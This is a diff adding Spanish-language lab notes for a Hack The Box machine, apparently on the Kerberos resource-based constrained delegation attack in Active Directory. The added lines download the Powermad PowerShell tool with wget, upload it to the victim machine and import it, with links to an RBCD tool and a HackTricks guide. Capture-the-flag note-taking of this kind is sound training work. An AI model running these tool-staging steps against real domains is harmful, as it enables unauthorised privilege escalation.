@@ -256,4 +256,20 @@ SI hacemos clic sobre el privilegio podemos ver como se realizaría la escalada 
 Este ataque se basa en obtener un `Service Ticket` para ganar acceso aprovechándose de `Kerberos` impresionando a un usuario
 Usaremos una herramienta llamada [[RBCD]] de GitHub `https://github.com/tothi/rbcd-attack`
 
+Pero también lo podemos hacer manualmente siguiendo los pasos que nos indica `https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html`
+
+Obteniendo primero la herramienta [[POWERMAD]] y subiéndola a la maquina victima
+```sehll
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
+```
+
+En la maquina victima lo subimos usando 
+```shell
+upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/Powermad.ps1
+```
+
+Lo importamos para que sea interpretado
+```shell
+Import-Module .\Powermad.ps1
+```
 
